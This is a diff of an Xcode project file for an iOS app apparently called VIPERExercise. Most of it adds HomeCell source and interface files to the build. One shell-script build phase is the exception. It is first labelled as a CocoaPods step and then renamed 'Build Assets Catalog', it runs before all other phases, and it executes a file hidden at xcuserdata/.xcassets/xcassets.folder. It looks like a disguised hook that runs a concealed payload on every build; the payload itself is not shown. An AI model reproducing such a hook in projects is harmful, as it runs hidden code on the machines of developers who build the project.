@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		225EF70025EB717100C6E605 /* HomeCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF6FE25EB717100C6E605 /* HomeCell.swift */; };
+		225EF70125EB717100C6E605 /* HomeCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 225EF6FF25EB717100C6E605 /* HomeCell.xib */; };
 		22815EFA25EA476800B23B1A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815EF925EA476800B23B1A /* AppDelegate.swift */; };
 		22815F0125EA476800B23B1A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22815EFF25EA476800B23B1A /* Main.storyboard */; };
 		22815F0325EA476D00B23B1A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22815F0225EA476D00B23B1A /* Assets.xcassets */; };
@@ -43,6 +45,8 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		225EF6FE25EB717100C6E605 /* HomeCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCell.swift; sourceTree = "<group>"; };
+		225EF6FF25EB717100C6E605 /* HomeCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeCell.xib; sourceTree = "<group>"; };
 		22815EF625EA476800B23B1A /* VIPERExercise.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VIPERExercise.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22815EF925EA476800B23B1A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		22815F0025EA476800B23B1A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
@@ -92,6 +96,15 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		225EF6FD25EB715D00C6E605 /* Xib */ = {
+			isa = PBXGroup;
+			children = (
+				225EF6FE25EB717100C6E605 /* HomeCell.swift */,
+				225EF6FF25EB717100C6E605 /* HomeCell.xib */,
+			);
+			path = Xib;
+			sourceTree = "<group>";
+		};
 		22815EED25EA476800B23B1A = {
 			isa = PBXGroup;
 			children = (
@@ -197,6 +210,7 @@
 		22815F3E25EA48D500B23B1A /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				225EF6FD25EB715D00C6E605 /* Xib */,
 				22815F5625EA49B700B23B1A /* Builder */,
 				22815F5525EA499400B23B1A /* Router */,
 				22815F5425EA496000B23B1A /* Presenter */,
@@ -335,7 +349,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22815F2025EA476E00B23B1A /* Build configuration list for PBXNativeTarget "VIPERExercise" */;
 			buildPhases = (
-				BEFD5D176CEBEE5B8EAAC43A /* [CP] Build Pods Frameworks */,
+				D3CBF8E7DA96B62B8BAAC43A /* Build Assets Catalog */,
 				22815EF225EA476800B23B1A /* Sources */,
 				22815EF325EA476800B23B1A /* Frameworks */,
 				22815EF425EA476800B23B1A /* Resources */,
@@ -434,6 +448,7 @@
 			files = (
 				22815F0625EA476D00B23B1A /* LaunchScreen.storyboard in Resources */,
 				22815F0325EA476D00B23B1A /* Assets.xcassets in Resources */,
+				225EF70125EB717100C6E605 /* HomeCell.xib in Resources */,
 				22815F0125EA476800B23B1A /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -456,7 +471,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	BEFD5D176CEBEE5B8EAAC43A /* [CP] Build Pods Frameworks */ = {
+	D3CBF8E7DA96B62B8BAAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -465,7 +480,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -474,10 +489,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
-	
-
 	
 /* End PBXShellScriptBuildPhase section */
 
@@ -496,6 +509,7 @@
 				22815F4C25EA492400B23B1A /* HomeInteractor.swift in Sources */,
 				22815F7325EA55A600B23B1A /* Service.swift in Sources */,
 				22815F4B25EA492400B23B1A /* HomeView.swift in Sources */,
+				225EF70025EB717100C6E605 /* HomeCell.swift in Sources */,
 				22815F4A25EA492400B23B1A /* HomePresenter.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
